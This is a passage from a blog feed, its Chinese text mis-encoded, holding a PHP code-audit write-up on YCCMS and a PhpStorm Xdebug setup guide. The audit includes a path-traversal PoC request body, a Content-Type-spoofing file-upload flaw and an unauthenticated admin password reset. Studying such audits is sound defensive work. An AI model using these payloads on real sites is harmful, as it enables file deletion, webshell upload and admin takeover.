src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080952517.png" alt="20250712200604332"></p><p>æ‰§è¡Œåå‘ç°è¿™ç¯‡æ–‡ç« è¢«åˆ é™¤äº†</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080952547.png" alt="20250712200619491"></p><h4 id="delall"><a href="#delall" class="headerlink" title="delall()"></a>delall()</h4><p>åŠŸèƒ½ç‚¹ï¼šæ­¤å¤„å¤šé€‰åˆ é™¤</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080952341.png" alt="20250712201015073"></p><p>æŠ“åŒ…ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080952688.png" alt="20250712201031989"></p><p><code>showid%5B%5D=2449&amp;showid%5B%5D=2448&amp;showid%5B%5D=2447&amp;showid%5B%5D=2446&amp;chkall=on&amp;send=%E6%89%B9%E9%87%8F%E5%88%A0%E9%99%A4</code></p><p>åŒæ ·çš„ï¼Œæ„é€ POCï¼š</p><p><code>showid%5B%5D=%2F..%2F1.txt&amp;showid%5B%5D=2448&amp;showid%5B%5D=2447&amp;showid%5B%5D=2446&amp;chkall=on&amp;send=%E6%89%B9%E9%87%8F%E5%88%A0%E9%99%A4</code></p><p>è·¯ç”±ï¼šadmin&#x2F;?a&#x3D;article&amp;m&#x3D;delall</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080953834.png" alt="20250712201614722"></p><p>ä½†æ˜¯åªåˆ é™¤äº†æ–‡ç« å¹¶æ²¡æœ‰åˆ é™¤1.txt ï¼Ÿï¼Ÿ</p><p>å†è®¤çœŸåˆ†æä¸€éï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;showid&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$_value</span>)&#123;<br><span class="hljs-variable language_">$this</span>-&gt;_model-&gt;id=<span class="hljs-variable">$_value</span>;<span class="hljs-comment">//è·å–æ–‡ç« id</span><br><span class="hljs-variable">$_findOne</span>=<span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">findOne</span>();<span class="hljs-comment">//æ•°æ®åº“æŸ¥è¯¢</span><br><span class="hljs-variable">$html</span>=<span class="hljs-variable">$_findOne</span>[<span class="hljs-number">0</span>]-&gt;html;<span class="hljs-comment">//ä»æ•°æ®åº“ä¸­è·å– HTML</span><br></code></pre></td></tr></table></figure><p>ç›´æ¥ä¼ é€’<code>/../1.txt</code>ä½œä¸ºIDå€¼ï¼Œç³»ç»Ÿä¼šå°†<code>/../1.txt</code>å½“ä½œæ–‡ç« IDå»æ•°æ®åº“æŸ¥è¯¢ï¼Œæ˜¾ç„¶è¿™ä¸ªIDä¸å­˜åœ¨</p><p>æƒ³è¦åˆ©ç”¨è¿™é‡Œçš„æ¼æ´ï¼Œåªèƒ½å»æ›´æ”¹æ•°æ®åº“ä¸­HTMLçš„å†…å®¹ï¼Œ</p><p>æ·»åŠ ã€ä¿®æ”¹ã€åˆ é™¤éƒ½è¿›è¡Œäº†ç”¨æˆ·éªŒè¯ï¼Œæ‰€ä»¥è¿™ä¸ªä¹Ÿä¸ç®—ä¸€ä¸ªæ¼æ´äº†ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]);<br><span class="hljs-variable">$html</span>=<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;html_temp&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;html_temp&#x27;</span>]=<span class="hljs-variable">$_art</span>[<span class="hljs-number">0</span>]-&gt;html;<br></code></pre></td></tr></table></figure><h3 id="ä»»æ„æ–‡ä»¶ä¸Šä¼ "><a href="#ä»»æ„æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="ä»»æ„æ–‡ä»¶ä¸Šä¼ "></a>ä»»æ„æ–‡ä»¶ä¸Šä¼ </h3><p>controller&#x2F;CallAction.class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment">//å¤„ç†ä¸Šä¼ å›¾ç‰‡</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upLoad</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;send&#x27;</span>])) &#123;<br><span class="hljs-variable">$_logoupload</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LogoUpload</span>(<span class="hljs-string">&#x27;pic&#x27;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;MAX_FILE_SIZE&#x27;</span>]);<br><span class="hljs-variable">$_path</span> = <span class="hljs-variable">$_logoupload</span>-&gt;<span class="hljs-title function_ invoke__">getPath</span>();<br><span class="hljs-variable">$_img</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>(<span class="hljs-variable">$_path</span>);<br><span class="hljs-variable">$_img</span>-&gt;<span class="hljs-title function_ invoke__">xhImg</span>(<span class="hljs-number">960</span>,<span class="hljs-number">0</span>);<br><span class="hljs-variable">$_img</span>-&gt;<span class="hljs-title function_ invoke__">out</span>();<br><span class="hljs-comment">//echo $_path;</span><br><span class="hljs-variable">$_logoupload</span>-&gt;<span class="hljs-title function_ invoke__">alertOpenerClose</span>(<span class="hljs-string">&#x27;å›¾ç‰‡ä¸Šä¼ æˆåŠŸï¼&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>.<span class="hljs-variable">$_path</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;è­¦å‘Šï¼šæ–‡ä»¶è¿‡å¤§æˆ–è€…å…¶ä»–æœªçŸ¥é”™è¯¯å¯¼è‡´æµè§ˆå™¨å´©æºƒï¼&#x27;</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//æ„é€ æ–¹æ³•ï¼Œåˆå§‹åŒ–</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$_file</span>,<span class="hljs-variable">$_maxsize</span></span>) </span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;error = <span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$_file</span>][<span class="hljs-string">&#x27;error&#x27;</span>];<br><span class="hljs-variable language_">$this</span>-&gt;maxsize = <span class="hljs-variable">$_maxsize</span> / <span class="hljs-number">1024</span>;<br><span class="hljs-variable language_">$this</span>-&gt;type = <span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$_file</span>][<span class="hljs-string">&#x27;type&#x27;</span>];<br><span class="hljs-variable language_">$this</span>-&gt;path = ROOT_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.UPLOGO;<br><span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$_file</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-variable language_">$this</span>-&gt;tmp = <span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$_file</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">checkError</span>();<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">checkType</span>();<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">checkPath</span>();<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">moveUpload</span>();<br>&#125;<br><br></code></pre></td></tr></table></figure><p>æ ¹æ®Content-Typeçš„å€¼æ¥åˆ¤æ–­æ˜¯å¦æ˜¯å›¾ç‰‡æ ¼å¼ï¼Œåªè¦Content-Typeæ˜¯è¿™ä¸¤ç§ç±»å‹å°±å¯ä»¥ï¼Œé‚£ç›´æ¥ä¼ªé€ Content-Typeå°±å¯ä»¥äº†</p><h3 id="ä»»æ„æ–‡ä»¶ä¸Šä¼ -2"><a href="#ä»»æ„æ–‡ä»¶ä¸Šä¼ -2" class="headerlink" title="ä»»æ„æ–‡ä»¶ä¸Šä¼ -2"></a>ä»»æ„æ–‡ä»¶ä¸Šä¼ -2</h3><p>controller&#x2F;CallAction.class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//xheditorç¼–è¾‘å™¨ä¸“ç”¨ä¸Šä¼ </span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">xhUp</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;type&#x27;</span>])) &#123;<br><span class="hljs-variable">$_fileupload</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileUpload</span>(<span class="hljs-string">&#x27;filedata&#x27;</span>,<span class="hljs-number">10</span>);<br><span class="hljs-variable">$_err</span>=<span class="hljs-variable">$_fileupload</span>-&gt;<span class="hljs-title function_ invoke__">checkError</span>();<br><span class="hljs-variable">$_path</span> = <span class="hljs-variable">$_fileupload</span>-&gt;<span class="hljs-title function_ invoke__">getPath</span>();<br><span class="hljs-variable">$_msg</span>=<span class="hljs-string">&quot;&#x27;..<span class="hljs-subst">$_path</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$_img</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>(<span class="hljs-variable">$_path</span>);<br><span class="hljs-variable">$_img</span>-&gt;<span class="hljs-title function_ invoke__">xhImg</span>(<span class="hljs-number">650</span>,<span class="hljs-number">0</span>);<br><span class="hljs-variable">$_img</span>-&gt;<span class="hljs-title function_ invoke__">out</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&#123;&#x27;err&#x27;:&#x27;&quot;</span>.<span class="hljs-variable">$_err</span>.<span class="hljs-string">&quot;&#x27;,&#x27;msg&#x27;:&quot;</span>.<span class="hljs-variable">$_msg</span>.<span class="hljs-string">&quot;&#125;&quot;</span>;<br><span class="hljs-keyword">exit</span>();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">alertBack</span>(<span class="hljs-string">&#x27;è­¦å‘Šï¼šç”±äºéæ³•æ“ä½œå¯¼è‡´ä¸Šä¼ å¤±è´¥ï¼&#x27;</span>);<br>&#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>ä»£ç ä¸­çš„æ–‡ä»¶åä»¥æ—¶é—´+100åˆ°1000ä¹‹é—´çš„éšæœºæ•°è¿›è¡Œé‡å‘½å</p><p>åŒæ ·ä¹Ÿæ˜¯æ£€æŸ¥çš„ä¼ å…¥çš„Content-Typeçš„å€¼</p><h3 id="æœªæˆæƒæ›´æ”¹ç®¡ç†å‘˜è´¦å·å¯†ç "><a href="#æœªæˆæƒæ›´æ”¹ç®¡ç†å‘˜è´¦å·å¯†ç " class="headerlink" title="æœªæˆæƒæ›´æ”¹ç®¡ç†å‘˜è´¦å·å¯†ç "></a><strong>æœªæˆæƒæ›´æ”¹ç®¡ç†å‘˜è´¦å·å¯†ç </strong></h3><p>é¦–å…ˆæ¥çœ‹ä¸€ä¸‹æ¼æ´åˆ©ç”¨è¿‡ç¨‹ï¼Œåœ¨æœªç™»å½•çš„æƒ…å†µä¸‹æ„é€ url,åªéœ€è¦æ›´æ”¹username password notpasswordçš„å€¼å³å¯æ›´æ”¹æ•°æ®åº“ä¸­adminè´¦å·çš„ç›¸å…³ä¿¡æ¯</p><p>æ ¹æ®urlæ¥å®šä½ä¸€ä¸‹æ¼æ´å‡½æ•°ï¼Œå‡½æ•°ä½äºcontroller\AdminAction.class.phpä¸­çš„updateå‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;send&#x27;</span>]))&#123;<br>            <span class="hljs-keyword">if</span>(validate::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>])) <span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">t_back</span>(<span class="hljs-string">&#x27;ç”¨æˆ·åä¸èƒ½ä¸ºç©º&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>);<br>            <span class="hljs-keyword">if</span>(validate::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) <span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">t_back</span>(<span class="hljs-string">&#x27;å¯†ç ä¸èƒ½ä¸ºç©º!&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>);<br>            <span class="hljs-keyword">if</span>(!(validate::<span class="hljs-title function_ invoke__">checkStrEquals</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;notpassword&#x27;</span>]))) <span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">t_back</span>(<span class="hljs-string">&#x27;ä¸¤æ¬¡å¯†ç ä¸ä¸€è‡´!&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>);<br>            <span class="hljs-variable language_">$this</span>-&gt;_model-&gt;username=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>            <span class="hljs-variable language_">$this</span>-&gt;_model-&gt;password=<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>            <span class="hljs-variable">$_edit</span>=<span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">editAdmin</span>();<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_edit</span>)&#123;<br>                tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;å¯†ç ä¿®æ”¹æˆåŠŸ!&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>,<span class="hljs-number">6</span>);<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;å¯†ç æœªä¿®æ”¹!&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>,<span class="hljs-number">6</span>);<br>            &#125;<br>        &#125;<br><br>            <span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]);<br>            <span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-string">&#x27;admin/public/update.tpl&#x27;</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å‰é¢éƒ½æ˜¯ä¸€äº›åˆ¤æ–­ï¼Œé‡ç‚¹å…³æ³¨ä¸‹editAdmin()å‡½æ•°ï¼Œè¯¥å‡½æ•°ä½äºmodel\AdminModel.class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">editAdmin</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$_sql</span>=<span class="hljs-string">&quot;UPDATE</span><br><span class="hljs-string">                    my_admin</span><br><span class="hljs-string">                SET</span><br><span class="hljs-string">                    username=&#x27;<span class="hljs-subst">$this</span>-&gt;username&#x27;,</span><br><span class="hljs-string">                    password=&#x27;<span class="hljs-subst">$this</span>-&gt;password&#x27;</span><br><span class="hljs-string">                WHERE</span><br><span class="hljs-string">                    id=1</span><br><span class="hljs-string">                LIMIT 1&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">update</span>(<span class="hljs-variable">$_sql</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>è¯¥å‡½æ•°çš„çˆ¶ç±»ä¸ºModel, ä½äºmodel\Model.class.phpï¼Œçœ‹ä¸€ä¸‹updateå‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"><span class="hljs-variable">$_sql</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>(<span class="hljs-variable">$_sql</span>)-&gt;<span class="hljs-title function_ invoke__">rowCount</span>();<br>    &#125;<br></code></pre></td></tr></table></figure><p>è°ƒç”¨executeå‡½æ•°å»æ‰§è¡Œsqlè¯­å¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span>(<span class="hljs-params"><span class="hljs-variable">$_sql</span></span>)</span>&#123;<br>        <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-variable">$_stmt</span>=<span class="hljs-variable language_">$this</span>-&gt;_db-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-variable">$_sql</span>);<br>            <span class="hljs-variable">$_stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>        &#125;<span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>)&#123;<br>            <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;SQLè¯­å¥:&#x27;</span>.<span class="hljs-variable">$_sql</span>.<span class="hljs-string">&#x27;&lt;br /&gt;é”™è¯¯ä¿¡æ¯:&#x27;</span>.<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>());<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$_stmt</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸€ç³»åˆ—çš„æ“ä½œä¸»è¦æ˜¯ç”¨æ¥ç”ŸæˆSQLè¯­å¥ç„¶åæ‰§è¡ŒSQLè¯­å¥ï¼ŒeditAdminå‡½æ•°ç›´æ¥æŠŠä¼ è¿›æ¥çš„username passwordæ‹¼æ¥åˆ°sqlè¯­å¥ä¸­ï¼Œç„¶åå»æ›´æ–°ç›¸å…³è¡¨ä¸­id&#x3D;1çš„æ•°æ®ï¼Œè¿™ä¹Ÿå°±é€ æˆäº†ä»»æ„æ›´æ”¹ç®¡ç†å‘˜è´¦å·å¯†ç </p>]]></content>
    
    
    <categories>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP ä»£ç å®¡è®¡</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP storm é…ç½® XDebug</title>
    <link href="/2025/07/08/PHP%20storm%20%E9%85%8D%E7%BD%AE%20XDebug/"/>
    <url>/2025/07/08/PHP%20storm%20%E9%85%8D%E7%BD%AE%20XDebug/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP-storm-é…ç½®-XDebug"><a href="#PHP-storm-é…ç½®-XDebug" class="headerlink" title="PHP storm é…ç½® XDebug"></a>PHP storm é…ç½® XDebug</h1><p>åœ¨å°çš®é¢æ¿æ‰¾åˆ°å¯¹åº”ç‰ˆæœ¬ï¼Œæ‰“å¼€XDebugç»„ä»¶</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080957606.png" alt="20250708133948343"></p><p><strong>php.inié…ç½®ï¼šï¼ˆé…ç½®å®Œæˆåé‡å¯æœåŠ¡ï¼‰</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080957876.png" alt="20250708134137512"></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Xdebug]</span><br><span class="hljs-attr">zend_extension</span>=D:/CTF-Tools/phpstudy_pro/Extensions/php/php5.<span class="hljs-number">5.9</span>nts/ext/php_xdebug.dll<br><span class="hljs-attr">xdebug.collect_params</span>=<span class="hljs-number">1</span><br><span class="hljs-attr">xdebug.collect_return</span>=<span class="hljs-number">1</span><br><span class="hljs-attr">xdebug.auto_trace</span>=<span class="hljs-literal">Off</span><br><span class="hljs-attr">xdebug.trace_output_dir</span>=D:/CTF-Tools/phpstudy_pro/Extensions/php_log/php5.<span class="hljs-number">5.9</span>nts.xdebug.trace<br><span class="hljs-attr">xdebug.profiler_enable</span>=<span class="hljs-literal">Off</span><br><span class="hljs-attr">xdebug.profiler_output_dir</span>=<span class="hljs-string">&quot;D:\CTF-Tools\phpstudy_pro\Extensions\tmp\xdebug&quot;</span><br><span class="hljs-attr">xdebug.remote_enable</span>=<span class="hljs-literal">On</span><br><span class="hljs-attr">xdebug.remote_host</span>=localhost<br><span class="hljs-attr">xdebug.remote_port</span>=<span class="hljs-number">9100</span><br><span class="hljs-attr">xdebug.remote_handler</span>=dbgp<br><span class="hljs-attr">xdebug.mode</span>=debug<br><span class="hljs-attr">xdebug.idekey</span> = PHPSTORM<br><span class="hljs-attr">xdebug.remote_enable</span>=<span class="hljs-literal">On</span><br></code></pre></td></tr></table></figure><p><strong>æ¥ä¸‹æ¥æ‰“å¼€PHP stormè®¾ç½®ï¼š</strong></p><p>-&gt;PHP&gt;è°ƒè¯•&gt;DBGpä»£ç†           </p><p>IDE é”®ï¼š<strong>PHPSTORM</strong><code>xdebug.idekey = PHPSTORM</code></p><p>ä¸»æœºï¼š<strong>localhost</strong><code>xdebug.remote_host=localhost</code></p><p>ç«¯å£ï¼š<strong>9001</strong><code>xdebug.remote_port=9100</code></p><p>å°†ç«¯å£å¯¹åº” <code>xdebug.remote_port=9100</code> php.ini é…ç½®ä¸º <strong>9100</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080957897.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080959634.png" alt="20250708134451487"></p><p>-&gt;PHP&gt;æœåŠ¡å™¨    </p><p>åç§°ï¼šyccms ï¼ˆéšæ„ï¼‰</p><p>ä¸»æœºï¼š<strong>localhost</strong><code>xdebug.remote_host=localhost</code></p><p>ç«¯å£ï¼š80          ï¼ˆä¿æŒé»˜è®¤ 80 å³å¯ï¼‰</p><p>è°ƒè¯•å™¨ï¼š<strong>Xdebug</strong></p><ul><li><input checked="" disabled="" type="checkbox"> ä½¿ç”¨è·¯å¾„æ˜ å°„</li></ul><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080959883.png" alt="20250708134711734"></p><p>è¿è¡Œä¸€ä¸ªæ–°çš„ PHP web é…ç½®</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080959990.png" alt="20250708134943149"></p><p>æœåŠ¡å™¨ï¼šyccmsï¼ˆé€‰æ‹©ä¸Šä¸€æ­¥é…ç½®å¥½çš„æœåŠ¡å™¨ï¼‰</p><p>èµ·å§‹URL: <a href="http://localhost:7676/">http://localhost:7676</a>    ï¼ˆæ­¤å¤„çš„ç«¯å£å¯¹åº”ä¸Š xp æ­å»ºç½‘ç«™æ—¶çš„ç«¯å£ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508081000588.png" alt="20250708135039223"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508081000527.png" alt="20250708135256894"></p><p>éªŒè¯ä¸€ä¸‹ï¼š</p><p>é™¤äº†ä¸‹é¢çš„ä¸‰ä¸ªé»„æ ‡ï¼Œå…¶ä»–æ²¡æœ‰é—®é¢˜å°±å¯ä»¥æ­£å¸¸ä½¿ç”¨è°ƒè¯•äº†</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508081000114.png" alt="20250708135357214"></p>]]></content>
    
    
    <categories>
      
      <category>ç¯å¢ƒæ­å»º</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ç¯å¢ƒæ­å»º</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
